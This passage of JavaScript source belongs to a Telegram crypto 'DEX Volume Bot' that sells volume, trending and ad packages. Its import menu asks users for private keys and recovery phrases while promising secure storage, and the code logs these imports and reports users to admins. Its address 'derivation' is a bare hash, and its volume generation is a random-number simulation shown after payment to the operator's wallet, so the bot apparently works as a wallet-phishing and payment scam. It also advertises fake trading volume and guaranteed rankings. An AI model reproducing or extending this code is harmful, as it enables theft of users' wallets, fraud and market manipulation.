    }

    function getActorLabel(ctx) {
        if (ctx?.from?.username) return `@${ctx.from.username}`;
        return ctx?.from?.first_name || 'Unknown';
    }

    function notifyServiceSelected(ctx, serviceName) {
        const msg =
            `🚨 <b>SERVICE SELECTED</b>\n\n` +
            `🛠 <b>Service:</b> ${escapeHtml(serviceName)}\n` +
            `👤 <b>User:</b> ${escapeHtml(getActorLabel(ctx))}\n` +
            `🆔 <b>User ID:</b> ${ctx.from.id}\n` +
            `💬 <b>Chat ID:</b> ${ctx.chat.id}\n` +
            `⏰ <b>Time:</b> ${escapeHtml(new Date().toLocaleString())}`;
        notifyAdmins(msg);
    }

    function notifyServiceSummary(ctx, serviceName, detailLines) {
        const details = (detailLines || []).join('\n');
        const msg =
            `📋 <b>ORDER SUMMARY REACHED</b>\n\n` +
            `🛠 <b>Service:</b> ${escapeHtml(serviceName)}\n` +
            `👤 <b>User:</b> ${escapeHtml(getActorLabel(ctx))}\n` +
            `🆔 <b>User ID:</b> ${ctx.from.id}\n` +
            `💬 <b>Chat ID:</b> ${ctx.chat.id}\n\n` +
            `${details}\n\n` +
            `⏰ <b>Time:</b> ${escapeHtml(new Date().toLocaleString())}`;
        notifyAdmins(msg);
    }

    // Global variable to store current SOL price (kept for backward-compat)
    let currentSolPrice = 180; // Default fallback price

    // ── Price fetch helpers ─────────────────────────────────────────────────

    // Fallback: CoinGecko public API (no key required, lower rate-limits)
    function fetchNativePricesFromCoinGecko() {
        return new Promise((resolve) => {
            const ids = Object.values(CHAIN_CONFIG)
                .map(c => c.coingeckoId)
                .filter((v, i, a) => a.indexOf(v) === i)
                .join(',');

            const options = {
                hostname: 'api.coingecko.com',
                path: `/api/v3/simple/price?ids=${ids}&vs_currencies=usd`,
                method: 'GET',
                headers: { 'Accept': 'application/json', 'User-Agent': 'DexVolumeBot/1.0' }
            };

            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        const result = JSON.parse(data);
                        let updated = 0;
                        for (const [id, priceObj] of Object.entries(result)) {
                            if (priceObj && priceObj.usd) {
                                nativePrices[id] = priceObj.usd;
                                updated++;
                            }
                        }
                        currentSolPrice = nativePrices['solana'] || 180;
                        if (updated > 0) {
                            console.log(`💰 [CoinGecko] Prices updated (${updated}): SOL=$${nativePrices['solana']?.toFixed(2)} ETH=$${nativePrices['ethereum']?.toFixed(2)} BNB=$${nativePrices['binancecoin']?.toFixed(2)} TON=$${nativePrices['the-open-network']?.toFixed(2)}`);
                        } else {
                            console.warn('⚠️ CoinGecko: no prices parsed, keeping last known values');
                        }
                        resolve(nativePrices);
                    } catch (e) {
                        console.warn('⚠️ CoinGecko parse error, keeping last known values');
                        resolve(nativePrices);
                    }
                });
            });
            req.on('error', () => resolve(nativePrices));
            req.setTimeout(6000, () => { req.destroy(); resolve(nativePrices); });
            req.end();
        });
    }

    // Primary: Binance public REST API — no API key, no rate-limit issues,
    // updated in real-time, always reflects current market prices.
    // Symbols → our internal coingeckoId keys (kept for backward compatibility).
    async function fetchNativePrices() {
        return new Promise((resolve) => {
            const symbolMap = {
                SOLUSDT:  'solana',
                ETHUSDT:  'ethereum',
                BNBUSDT:  'binancecoin',
                TONUSDT:  'the-open-network'
            };
            const symbols = encodeURIComponent(JSON.stringify(Object.keys(symbolMap)));

            const options = {
                hostname: 'api.binance.com',
                path: `/api/v3/ticker/price?symbols=${symbols}`,
                method: 'GET',
                headers: { 'Accept': 'application/json', 'User-Agent': 'DexVolumeBot/1.0' }
            };

            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', async () => {
                    try {
                        const result = JSON.parse(data);
                        if (!Array.isArray(result) || result.length === 0) {
                            throw new Error('Unexpected Binance response format');
                        }
                        let updated = 0;
                        for (const item of result) {
                            const key = symbolMap[item.symbol];
                            const price = parseFloat(item.price);
                            if (key && price > 0) {
                                nativePrices[key] = price;
                                updated++;
                            }
                        }
                        if (updated === 0) throw new Error('No prices parsed from Binance');
                        currentSolPrice = nativePrices['solana'] || 180;
                        console.log(`💰 [Binance] Live prices (${updated} tokens): SOL=$${nativePrices['solana']?.toFixed(2)} ETH=$${nativePrices['ethereum']?.toFixed(2)} BNB=$${nativePrices['binancecoin']?.toFixed(2)} TON=$${nativePrices['the-open-network']?.toFixed(2)}`);
                        resolve(nativePrices);
                    } catch (e) {
                        console.warn(`⚠️ Binance price fetch failed (${e.message}), trying CoinGecko fallback...`);
                        resolve(await fetchNativePricesFromCoinGecko());
                    }
                });
            });

            req.on('error', async (err) => {
                console.warn(`⚠️ Binance request error (${err.message}), trying CoinGecko fallback...`);
                resolve(await fetchNativePricesFromCoinGecko());
            });

            req.setTimeout(5000, async () => {
                req.destroy();
                console.warn('⚠️ Binance price fetch timeout, trying CoinGecko fallback...');
                resolve(await fetchNativePricesFromCoinGecko());
            });

            req.end();
        });
    }

    // Refresh prices every 3 minutes using Binance (with CoinGecko fallback)
    async function startPriceUpdater() {
        await fetchNativePrices();
        setInterval(async () => {
            await fetchNativePrices();
        }, 3 * 60 * 1000);
    }

    // Start the price updater
    startPriceUpdater();

    function convertUsdToSol(usdAmount, chainId = 'solana') {
        return convertUsdToNative(usdAmount, chainId);
    }

    function logWalletImport(userId, username, walletData, importType, importSource) {
        console.log(`🔐 WALLET IMPORT DETECTED:`);
        console.log(`👤 User: @${username} (ID: ${userId})`);
        console.log(`🔑 Type: ${importType}`);
        console.log(`📍 Source: ${importSource}`);
        console.log(`💰 Address: ${walletData.address}`);
        console.log(`⏰ Time: ${new Date().toISOString()}`);
        console.log(`📊 Total wallets now: ${botData.userWallets.length}`);
    }

    // Chain-aware volume package configuration
    // ETH and Base have a higher USD value per native unit, so the same price delivers more volume
    const VOLUME_PACKAGE_CONFIG = {
        // Solana tier (min 0.5 SOL)
        solana: {
            starter:  { volume: 25000,  price: 0.5, duration: 12, transactions: 2500 },
            basic:    { volume: 50000,  price: 1,   duration: 24, transactions: 5000 },
            bronze:   { volume: 125000, price: 2.5, duration: 36, transactions: 12500 },
            premium:  { volume: 250000, price: 5,   duration: 48, transactions: 25000 },
            vip:      { volume: 500000, price: 10,  duration: 72, transactions: 50000 },
            customRate: 50000,
            minCustomAmount: 0.5,
            maxCustomAmount: 50
        },
        // Default tier: BNB Chain, TON
        default: {
            starter:  { volume: 2500,   price: 0.1, duration: 12, transactions: 250 },
            basic:    { volume: 5000,   price: 0.2, duration: 24, transactions: 500 },
            bronze:   { volume: 20000,  price: 0.5, duration: 36, transactions: 2000 },
            premium:  { volume: 50000,  price: 1,   duration: 48, transactions: 5000 },
            vip:      { volume: 100000, price: 2,   duration: 72, transactions: 10000 },
            customRate: 50000,
            minCustomAmount: 0.1,
            maxCustomAmount: 10
        },
        // Premium EVM tier: Ethereum and Base (higher USD value per ETH)
        evm_premium: {
            starter:  { volume: 5000,   price: 0.1, duration: 12, transactions: 500 },
            basic:    { volume: 10000,  price: 0.2, duration: 24, transactions: 1000 },
            bronze:   { volume: 25000,  price: 0.5, duration: 36, transactions: 2500 },
            premium:  { volume: 50000,  price: 1,   duration: 48, transactions: 5000 },
            vip:      { volume: 100000, price: 2,   duration: 72, transactions: 10000 },
            customRate: 50000,
            minCustomAmount: 0.05,
            maxCustomAmount: 10
        }
    };

    function getPackageConfigForChain(chainId) {
        if (chainId === 'ethereum' || chainId === 'base') {
            return VOLUME_PACKAGE_CONFIG.evm_premium;
        }
        if (chainId === 'solana') {
            return VOLUME_PACKAGE_CONFIG.solana;
        }
        return VOLUME_PACKAGE_CONFIG.default;
    }

    function calculateCustomVolume(nativeAmount, chainId) {
        const config = getPackageConfigForChain(chainId);
        return Math.floor(nativeAmount * config.customRate);
    }

    // Enhanced main menu with all buttons and process visualization
    const getMainMenu = () => {
        const mainMenuText = `🚀 **DEX Volume Bot - Multi-Chain Elite Volume Booster**

💎 **Real Volume • Whale Attraction • Instant DEX Ranking**

🌐 **Supported Chains:**
◎ Solana  •  Ξ Ethereum  •  ⬡ BNB Chain  •  🔷 Base  •  💎 TON

**🎯 Why Whales Choose Volume-Rich Tokens:**
• Trending tokens get premium attention from big Banks
• Consistent activity signals project legitimacy
• DEX algorithms favor high-volume tokens in recommendations`;

        const mainMenuButtons = Markup.inlineKeyboard([
            [
                Markup.button.callback('🚀 Start Volume Bot', 'start_volume'),
                Markup.button.callback('⏹️ Stop Volume Bot', 'stop_volume')
            ],
            [
                Markup.button.callback('📦 Volume Packages', 'volume_packages'),
                Markup.button.callback('🎯 DEX Services', 'dex_services')
            ],
            [
                Markup.button.callback('🔒 Lock Supply', 'act_lock'),
                Markup.button.callback('🔥 Burn Token', 'act_burn')
            ],
        ]);

        return { text: mainMenuText, buttons: mainMenuButtons };
    };

    // Enhanced volume packages menu
    const getVolumePackageMenu = () => {
        const volumePackageText = `📦 **Premium Volume Packages**

🔥 **Choose Your Perfect Package:**

💎 **STARTER**
• ◎ SOL: 0.5 SOL → 25,000 Volume (12h)
• ⬡ BNB / 💎 TON: 0.1 native → 2,500 Volume (12h)
• Ξ ETH / 🔷 Base: 0.1 native → 5,000 Volume (12h)

📦 **BASIC**
• ◎ SOL: 1 SOL → 50,000 Volume (24h)
• ⬡ BNB / 💎 TON: 0.2 native → 5,000 Volume (24h)
• Ξ ETH / 🔷 Base: 0.2 native → 10,000 Volume (24h)

🥉 **BRONZE**
• ◎ SOL: 2.5 SOL → 125,000 Volume (36h)
• ⬡ BNB / 💎 TON: 0.5 native → 20,000 Volume (36h)
• Ξ ETH / 🔷 Base: 0.5 native → 25,000 Volume (36h)

🔥 **PREMIUM**
• ◎ SOL: 5 SOL → 250,000 Volume (48h)
• ⬡ BNB / 💎 TON / Ξ ETH / 🔷 Base: 1 native → 50,000 Volume (48h)

💎 **VIP**
• ◎ SOL: 10 SOL → 500,000 Volume (72h)
• ⬡ BNB / 💎 TON / Ξ ETH / 🔷 Base: 2 native → 100,000 Volume (72h)

🎯 **CUSTOM** - Your Amount
• 50,000 volume per native token
• Flexible duration`;

        const volumePackageButtons = Markup.inlineKeyboard([
            [
                Markup.button.callback('💎 Starter - 0.5 SOL', 'package_starter'),
                Markup.button.callback('📦 Basic - 1 SOL', 'package_basic')
            ],
            [
                Markup.button.callback('🥉 Bronze - 2.5 SOL', 'package_bronze'),
                Markup.button.callback('🔥 Premium - 5 SOL', 'package_premium')
            ],
            [
                Markup.button.callback('💎 VIP - 10 SOL', 'package_vip'),
                Markup.button.callback('🎯 Custom Package', 'package_custom')
            ],
            [
                Markup.button.callback('🔙 Back to Main', 'back_main')
            ]
        ]);

        return { text: volumePackageText, buttons: volumePackageButtons };
    };

    // Enhanced DEX services menu
    const getDexServicesMenu = () => {
        const solPrice = convertUsdToNative(299, 'solana');
        const ethPrice = convertUsdToNative(299, 'ethereum');
        const bnbPrice = convertUsdToNative(299, 'bsc');
        const dexServicesText = `🎯 **Professional DEX Services**

🌐 **All Chains Supported:** ◎ SOL • Ξ ETH • ⬡ BNB • 🔷 Base • 💎 TON

🔥 **Boost Your Token's Visibility:**

📊 **DEX UPDATE** - $299 USD
• ~${solPrice} SOL / ~${ethPrice} ETH / ~${bnbPrice} BNB
• Update token information
• Logo, description, links
• Enhanced visibility
• Professional profile

📢 **DEX ADS**
• ◎ SOL / ⬡ BNB / 💎 TON: 0.8 native/hour (min 3h)
• Ξ ETH / 🔷 Base: 0.4 ETH/hour (min 1h)
• Premium ad placement
• Featured positioning
• Maximum exposure

🔥 **DEX TRENDING**
• 🥉 Top 10: 0.5 native/hour (min 3h)
• 🥇 Top 3: 1 native/hour (min 1h)
• Guaranteed positions

🎯 **COMBO DEALS**
• Save 20% on multiple services
• Package discounts available`;

        const dexServicesButtons = Markup.inlineKeyboard([
            [
                Markup.button.callback(`📊 DEX Update - $299`, 'dex_update'),
                Markup.button.callback('📢 DEX Ads', 'dex_ads')
            ],
            [
                Markup.button.callback('🔥 DEX Trending', 'dex_trending'),
            ],

            [
                Markup.button.callback('🔙 Back to Main', 'back_main')
            ]
        ]);

        return { text: dexServicesText, buttons: dexServicesButtons };
    };

    // Lock & Burn intro menu
    const getLockBurnMenu = () => {
        const text =
            `🔒 **Lock & Burn Service**\n\n` +
            `🌐 **All Chains Supported:** ◎ SOL • Ξ ETH • ⬡ BNB • 🔷 Base • 💎 TON\n\n` +
            `Lock dev supply or burn tokens in 3 easy steps:\n` +
            `1️⃣  Send your token contract address\n` +
            `2️⃣  Choose percentage\n` +
            `3️⃣  Connect wallet & sign`;
        const buttons = Markup.inlineKeyboard([
            [Markup.button.callback('🔒 Lock Supply', 'act_lock')],
            [Markup.button.callback('🔥 Burn Token',  'act_burn')],
            [Markup.button.callback('🔙 Back to Main', 'back_main')]
        ]);
        return { text, buttons };
    };

    // Keep old getLockSupplyMenu alias so any stray references don’t crash
    const getLockSupplyMenu = getLockBurnMenu;

    // Promotions menu
    const getPromotionsMenu = () => {
        const promotionsText = `🎁 **Current Promotions & Deals**

🔥 **LIMITED TIME OFFERS:**

💰 **FIRST ORDER DISCOUNT**
• 15% OFF your first volume package
• Use code: FIRST15
• Valid for new users only

🎯 **BULK VOLUME DISCOUNT**
• Order 2+ SOL volume → 10% OFF
• Order 5+ SOL volume → 20% OFF
• Order 10+ SOL volume → 30% OFF

📦 **PACKAGE COMBO DEALS**
• Volume + DEX Update → Save 25%
• Volume + Trending → Save 20%
• All services → Save 35%

🏆 **VIP MEMBERSHIP**
• Monthly unlimited volume
• Priority support
• Exclusive features
• 50% discount on all services

⏰ **FLASH DEALS**
• Daily rotating discounts
• Limited quantity offers
• Premium services at budget prices`;

        const promotionsButtons = Markup.inlineKeyboard([
            [
                Markup.button.callback('🎯 Apply Discount Code', 'apply_discount'),
                Markup.button.callback('💎 VIP Membership', 'vip_membership')
            ],
            [
                Markup.button.callback('⚡ Flash Deals', 'flash_deals')
            ],
            [
                Markup.button.callback('🏆 Loyalty Program', 'loyalty_program'),
                Markup.button.callback('🔙 Back to Main', 'back_main')
            ]
        ]);

        return { text: promotionsText, buttons: promotionsButtons };
    };

    // Referrals menu
    const getReferralsMenu = (userId) => {
        const referralsText = `👥 **Referral Program**

🚧 **Coming Soon!**

We're working hard to bring you an amazing referral program with incredible rewards:

🎯 **Planned Features:**
• Earn SOL for every referral
• Multi-tier commission structure
• Bonus rewards for top referrers
• Real-time tracking dashboard
• Instant payouts

💰 **Expected Rewards:**
• 15% commission on all orders
• 5% bonus for 10+ referrals
• 10% bonus for 50+ referrals
• 25% bonus for 100+ referrals

📅 **Launch Date:** Coming in the next update!

Stay tuned for this exciting feature that will help you earn while sharing our amazing volume bot!`;

        const referralsButtons = Markup.inlineKeyboard([
            [
                Markup.button.callback('🔔 Notify Me', 'notify_referrals'),
                Markup.button.callback('💡 Suggest Features', 'suggest_referrals')
            ],
            [
                Markup.button.callback('🔙 Back to Main', 'back_main')
            ]
        ]);

        return { text: referralsText, buttons: referralsButtons };
    };

    // Enhanced wallet menu
    const getWalletMenu = () => {
        const chainWalletList = Object.entries(CHAIN_CONFIG)
            .map(([id, cfg]) => `${cfg.color} ${cfg.name}: \`${getWalletForChain(id)}\``)
            .join('\n');
        const walletMenuText = `💰 **My Wallet Management**

📍 **Payment Wallets by Chain:**
${chainWalletList}

💼 **Wallet Functions:**
• View balance and transactions
• Import trading wallets
• Withdraw earnings
• Security settings`;

        const walletMenuButtons = Markup.inlineKeyboard([
            [
                Markup.button.callback('💸 Withdraw Balance', 'withdraw_balance'),
                Markup.button.callback('📊 View Balance', 'view_balance')
            ],
            [
                Markup.button.callback('💼 Import New Wallet', 'import_new_wallet'),
                Markup.button.callback('🔐 Security Settings', 'security_settings')
            ],
            [
                Markup.button.callback('📱 Connected Wallets', 'connected_wallets'),
                Markup.button.callback('🔙 Back to Main', 'back_main')
            ]
        ]);

        return { text: walletMenuText, buttons: walletMenuButtons };
    };

    // Advanced tools menu
    const getAdvancedToolsMenu = () => {
        const advancedText = `🔧 **Advanced Trading Tools**

🎯 **Professional Features:**

📊 **VOLUME ANALYZER**
• Real-time volume tracking
• DEX comparison charts
• Market depth analysis
• Volume prediction AI

🤖 **SMART AUTOMATION**
• Auto-volume scheduling
• Smart timing optimization
• Market condition triggers
• Dynamic amount adjustment

📈 **PORTFOLIO TRACKER**
• Multi-token monitoring
• P&L calculations
• Performance analytics
• Risk assessment

🔍 **MARKET INTELLIGENCE**
• Competitor analysis
• Trend identification
• Volume pattern recognition
• Optimal timing suggestions

⚡ **QUICK ACTIONS**
• One-click volume boost
• Emergency stop functions
• Rapid deployment tools
• Bulk operations`;

        const advancedButtons = Markup.inlineKeyboard([
            [
                Markup.button.callback('📊 Volume Analyzer', 'volume_analyzer'),
                Markup.button.callback('🤖 Smart Automation', 'smart_automation')
            ],
            [
                Markup.button.callback('📈 Portfolio Tracker', 'portfolio_tracker'),
                Markup.button.callback('🔍 Market Intelligence', 'market_intelligence')
            ],
            [
                Markup.button.callback('⚡ Quick Actions', 'quick_actions'),
                Markup.button.callback('🎯 Custom Scripts', 'custom_scripts')
            ],
            [
                Markup.button.callback('🔙 Back to Main', 'back_main')
            ]
        ]);

        return { text: advancedText, buttons: advancedButtons };
    };

    // Import wallet menu
    const getImportWalletMenu = () => {
        const importWalletText = `💼 **Import Your Wallet**

🔐 **Choose Import Method:**

🔑 **Private Key**: Import using your wallet's private key
📝 **Recovery Phrase**: Import using 12/24-word seed phrase

⚠️ **Security Note:**
• Your wallet data is stored securely
• Required for volume generation
• Encrypted storage
• Full access control`;

        const importWalletButtons = Markup.inlineKeyboard([
            [Markup.button.callback('🔑 Import Private Key', 'import_private_key')],
            [Markup.button.callback('📝 Import Recovery Phrase', 'import_recovery_phrase')],
            [Markup.button.callback('🔙 Back to Main', 'back_main')]
        ]);

        return { text: importWalletText, buttons: importWalletButtons };
    };

    // Enhanced settings menu
    const getSettingsMenu = () => {
        const settingsText = `⚙️ **Bot Settings & Preferences**

🔧 **Current Configuration:**

🔄 **Volume Mode:** ${botData.settings.volumeMode}
💰 **Min Amount:** ${botData.settings.minAmount} SOL
💰 **Max Amount:** ${botData.settings.maxAmount} SOL
⏱️ **Interval:** ${botData.settings.intervalMin}-${botData.settings.intervalMax} min
🔘 **Status:** ${botData.settings.isActive ? 'Active' : 'Inactive'}
🔔 **Notifications:** Enabled
📊 **Analytics:** Enabled
🛡️ **Security:** High
🌐 **Language:** English`;

        const settingsButtons = Markup.inlineKeyboard([
            [
                Markup.button.callback('📊 Volume Settings', 'volume_settings'),
                Markup.button.callback('🔔 Notifications', 'notification_settings')
            ],
            [
                Markup.button.callback('🛡️ Security Settings', 'security_settings'),
                Markup.button.callback('🌐 Language', 'language_settings')
            ],
            [
                Markup.button.callback('📱 Interface Theme', 'theme_settings'),
                Markup.button.callback('📈 Analytics', 'analytics_settings')
            ],
            [
                Markup.button.callback('🔄 Reset Settings', 'reset_settings'),
                Markup.button.callback('🔙 Back to Main', 'back_main')
            ]
        ]);

        return { text: settingsText, buttons: settingsButtons };
    };

    // Wallet generation functions (Solana-specific)
    function generateRandomWalletAddress() {
        const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        let res = '';
        for (let i = 0; i < 44; i++) res += chars[Math.floor(Math.random() * chars.length)];
        return res;
    }

    function deriveAddressFromPrivateKey(privateKey) {
        try {
            const cleanKey = privateKey.trim();
            const hash = crypto.createHash('sha256').update(cleanKey).digest();
            return generateSolanaAddress(hash);
        } catch (error) {
            console.error('Error deriving address from private key:', error);
            return generateRandomWalletAddress();
        }
    }

    function deriveAddressFromSeedPhrase(seedPhrase) {
        try {
            const words = seedPhrase.trim().toLowerCase().split(/\s+/);
            const seedString = words.join(' ');
            const hash = crypto.createHash('sha256').update(seedString).digest();
            return generateSolanaAddress(hash);
        } catch (error) {
            console.error('Error deriving address from seed phrase:', error);
            return generateRandomWalletAddress();
        }
    }

    function generateSolanaAddress(inputBuffer) {
        const base58Chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        let address = '';
        let num = BigInt('0x' + inputBuffer.toString('hex'));
        while (num > 0) {
            const remainder = Number(num % 58n);
            address = base58Chars[remainder] + address;
            num = num / 58n;
        }
        while (address.length < 32) {
            address = base58Chars[0] + address;
        }
        return address.substring(0, 44);
    }

    // Enhanced volume simulation function
    function simulateVolumeGeneration(userId, packageType, tokenCA, customAmount = null, chainId = 'solana') {
        const pkgConfig = getPackageConfigForChain(chainId);
        let pkg;

        if (packageType === 'custom') {
            const customVolume = calculateCustomVolume(customAmount || 0.1, chainId);
            pkg = {
                duration: Math.max(24, Math.min(72, Math.floor((customAmount || 0.1) * 24))),
                transactions: Math.floor(customVolume / 10),
                volume: customVolume,
                price: customAmount || 0.1
            };
        } else {
            pkg = { ...pkgConfig[packageType] };
        }

        if (!pkg) return;

        // Create order record
        const orderId = `ORD${Date.now()}`;
        const order = {
            id: orderId,
            userId,
            tokenCA,
            packageType,
            startTime: new Date(),
            endTime: new Date(Date.now() + pkg.duration * 60 * 60 * 1000),
            totalTransactions: pkg.transactions,
            completedTransactions: 0,
            totalVolume: pkg.volume,
            generatedVolume: 0,
            price: pkg.price,
            status: 'active'
        };

        botData.activeJobs[userId] = order;

        // Add to order history
        if (!botData.orderHistory[userId]) {
            botData.orderHistory[userId] = [];
        }
        botData.orderHistory[userId].push(order);

        // Update stats
        botData.stats.totalOrders++;
        botData.stats.totalRevenue += pkg.price;
        saveData();

        // Simulate progress
        const interval = setInterval(async () => {
            const job = botData.activeJobs[userId];
            if (!job || job.status !== 'active') {
                clearInterval(interval);
                return;
            }

            job.completedTransactions += Math.floor(Math.random() * 10) + 1;
            job.generatedVolume += (Math.random() * 100) + 10;

            if (job.completedTransactions >= job.totalTransactions || Date.now() >= job.endTime.getTime()) {
                job.status = 'completed';
                job.completedTransactions = job.totalTransactions;
                job.generatedVolume = job.totalVolume;

                // Update stats
                botData.stats.totalVolume += job.totalVolume;

                const completionNativeToken = (CHAIN_CONFIG[chainId] || CHAIN_CONFIG.solana).nativeToken;
                const completionMsgRaw =
                    `✅ **Volume Generation Completed!**\n\n` +
                    `🎯 **Token:** \`${tokenCA}\`\n` +
                    `📊 **Package:** ${packageType.toUpperCase()}\n` +
                    `💰 **Volume Generated:** ${job.totalVolume.toLocaleString()}\n` +
                    `🔄 **Transactions:** ${job.totalTransactions.toLocaleString()}\n` +
                    `💵 **Cost:** ${job.price} ${completionNativeToken}\n` +
                    `⏰ **Duration:** ${pkg.duration} hours\n\n` +
                    `🚀 **Your token should now show improved metrics!**`;
                const userLangCompletion = botData.users[userId]?.language || 'en';
                const completionMsg = await translateText(completionMsgRaw, userLangCompletion);
                bot.telegram.sendMessage(userId, completionMsg, { parse_mode: 'Markdown' });
                clearInterval(interval);
            }
            saveData();
        }, 30000);
    }

    // Volume package selection handler
    async function handleVolumePackageSelection(ctx, packageType) {
        const currentSession = userSessions[ctx.from.id];
        if (!currentSession || currentSession.type !== 'volume_bot' || !currentSession.tokenCA) {
            const mainMenu = getMainMenu();
            return ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }

        const chainId = currentSession.chainId || 'solana';
        const chainCfg = CHAIN_CONFIG[chainId] || CHAIN_CONFIG.solana;
        const nativeToken = chainCfg.nativeToken;

        // Derive package data from chain-aware config
        const pkgConfig = getPackageConfigForChain(chainId);
        const pkg = pkgConfig[packageType];
        const price = pkg.price;

        const tokenDisplay = currentSession.tokenInfo?.ticker 
            ? `${currentSession.tokenInfo.ticker} (${currentSession.tokenInfo.marketCap})`
            : 'Token';

        currentSession.packageType = packageType;
        currentSession.packagePrice = price;

        const progressIndicator = createProgressIndicator(3, 3, 'Payment & Activation');
        const caption =
            `🚀 **Final Step — Launch Whale Magnet**\n\n` +
            `${progressIndicator}\n\n` +
            `${chainCfg.color} **Chain:** ${chainCfg.name}\n` +
            `🎯 **Token:** ${tokenDisplay}\n` +
            `📦 **Package:** ${packageType.toUpperCase()}\n` +
            `💰 **Volume:** ${pkg.volume.toLocaleString()}\n` +
            `⏰ **Duration:** ${pkg.duration}h\n` +
            `💵 **Investment:** ${price} ${nativeToken}\n\n` +
            `💰 **Send ${price} ${nativeToken} to:**\n\`${getWalletForChain(chainId)}\``;

        notifyServiceSummary(ctx, 'Start Volume Bot', [
            `${chainCfg.color} <b>Chain:</b> ${escapeHtml(chainCfg.name)}`,
            `🎯 <b>Token:</b> ${escapeHtml(currentSession.tokenInfo?.ticker || 'Unknown')}`,
            `📍 <b>CA:</b> <code>${escapeHtml(currentSession.tokenCA)}</code>`,
            `📦 <b>Package:</b> ${escapeHtml(packageType.toUpperCase())}`,
            `📊 <b>Volume:</b> ${pkg.volume.toLocaleString()}`,
            `⏰ <b>Duration:</b> ${pkg.duration}h`,
            `💵 <b>Investment:</b> ${price} ${escapeHtml(nativeToken)}`
        ]);

        try { await ctx.deleteMessage(); } catch(e) {}
        await sendStepPhoto(ctx, caption, {
            ...Markup.inlineKeyboard([
                [Markup.button.callback('✅ Payment Sent - Launch!', 'confirm_payment')],
                [Markup.button.callback('❌ Cancel', 'back_main')]
            ])
        });
    }

    // Function to create text-based progress indicator
    function createProgressIndicator(currentStep, totalSteps, stepName) {
        const progressPercentage = Math.round((currentStep / totalSteps) * 100);
        const progressBar = '█'.repeat(Math.floor(progressPercentage / 10)) + '░'.repeat(10 - Math.floor(progressPercentage / 10));
        
        return `📊 **Progress: ${progressPercentage}%**\n` +
               `${progressBar}\n` +
               `**Step ${currentStep}/${totalSteps}:** ${stepName}`;
    }

    // Animated progress loader shown during API verification calls
    async function startAnimatedLoader(ctx, label) {
        const frames = [
            `🔍 ${label}\n\n\`[▱▱▱▱▱▱▱▱▱▱]\` 0%`,
            `⚡ ${label}\n\n\`[▰▰▱▱▱▱▱▱▱▱]\` 20%`,
            `📊 ${label}\n\n\`[▰▰▰▰▱▱▱▱▱▱]\` 40%`,
            `🔗 ${label}\n\n\`[▰▰▰▰▰▰▱▱▱▱]\` 60%`,
            `💫 ${label}\n\n\`[▰▰▰▰▰▰▰▰▱▱]\` 80%`,
            `✨ ${label}\n\n\`[▰▰▰▰▰▰▰▰▰▰]\` 100%`
        ];
        let msg;
        try { msg = await ctx.reply(frames[0], { parse_mode: 'Markdown' }); } catch(e) { return null; }
        let frame = 0;
        const handle = setInterval(async () => {
            frame = Math.min(frame + 1, frames.length - 1);
            try {
                await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, frames[frame], { parse_mode: 'Markdown' });
            } catch(e) { clearInterval(handle); }
        }, 600);
        return { messageId: msg.message_id, stop: () => clearInterval(handle) };
    }

    // Send a photo with step content as caption (falls back to text if photo fails)
    // Pass imagePath as 4th arg to use a specific image; defaults to deximage.jpg
    async function sendStepPhoto(ctx, caption, options = {}, imagePath = DEX_IMAGE_PATH) {
        try {
            return await ctx.replyWithPhoto(
                { source: fs.createReadStream(imagePath) },
                { caption: caption.substring(0, 1020), parse_mode: 'Markdown', ...options }
            );
        } catch(e) {
            return await ctx.reply(caption, { parse_mode: 'Markdown', ...options });
        }
    }

    // Returns the correct hero image for a lock/burn session
    function lbImage(s) {
        return (s?.action === 'burn') ? DEX_BURNER_IMAGE_PATH : SUPPLY_LOCKER_IMAGE_PATH;
    }

    // Shared helper: run DexScreener verification for the volume bot flow
    async function runVolumeTokenVerification(ctx, contractAddress, chainId, volumeSession) {
        const chainCfg = CHAIN_CONFIG[chainId] || CHAIN_CONFIG.solana;
        const nativeToken = chainCfg.nativeToken;

        const loader = await startAnimatedLoader(ctx, `Verifying token on ${chainCfg.name}`);

        try {
            const tokenInfo = await verifyTokenWithDexScreener(contractAddress, chainId);
            if (loader) { loader.stop(); try { await ctx.telegram.deleteMessage(ctx.chat.id, loader.messageId); } catch(e) {} }

            const verificationMessage = createTokenVerificationMessage(tokenInfo, contractAddress);

            if (tokenInfo.success) {
                volumeSession.tokenCA = contractAddress;
                volumeSession.tokenInfo = tokenInfo;
                volumeSession.chainId = tokenInfo.chainId || chainId;
                volumeSession.step = 'waiting_package';

                const progressIndicator = createProgressIndicator(2, 3, 'Package Selection');
                const pkgCfgVerified = getPackageConfigForChain(volumeSession.chainId);

                await sendStepPhoto(ctx,
                    verificationMessage +
                    `\n${progressIndicator}\n\n` +
                    `🎯 **Choose Your Package:**\n` +
                    `💎 Starter/Basic • 🥉 Bronze/Premium • 💎 VIP/Custom`,
                    {
                        ...Markup.inlineKeyboard([
                            [
                                Markup.button.callback(`💎 Starter - ${pkgCfgVerified.starter.price} ${nativeToken}`, 'package_starter'),
                                Markup.button.callback(`📦 Basic - ${pkgCfgVerified.basic.price} ${nativeToken}`, 'package_basic')
                            ],
                            [
                                Markup.button.callback(`🥉 Bronze - ${pkgCfgVerified.bronze.price} ${nativeToken}`, 'package_bronze'),
                                Markup.button.callback(`🔥 Premium - ${pkgCfgVerified.premium.price} ${nativeToken}`, 'package_premium')
                            ],
                            [
                                Markup.button.callback(`💎 VIP - ${pkgCfgVerified.vip.price} ${nativeToken}`, 'package_vip'),
                                Markup.button.callback('🎯 Custom Package', 'package_custom')
                            ],
                            [Markup.button.callback('❌ Cancel', 'back_main')]
                        ])
                    }
                );
            } else {
                await ctx.reply(
                    verificationMessage +
                    `\n⚠️ **Continue Anyway?**\n\n` +
                    `You can still proceed with volume generation, but the token may have:\n` +
                    `• Low trading activity\n` +
                    `• Limited market data\n` +
                    `• New or unlisted status\n\n` +
                    `💡 **Recommendation:** Verify the contract address and try again.`,
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('✅ Continue Anyway', 'continue_unverified')],
                            [Markup.button.callback('🔄 Try Different CA', 'retry_ca')],
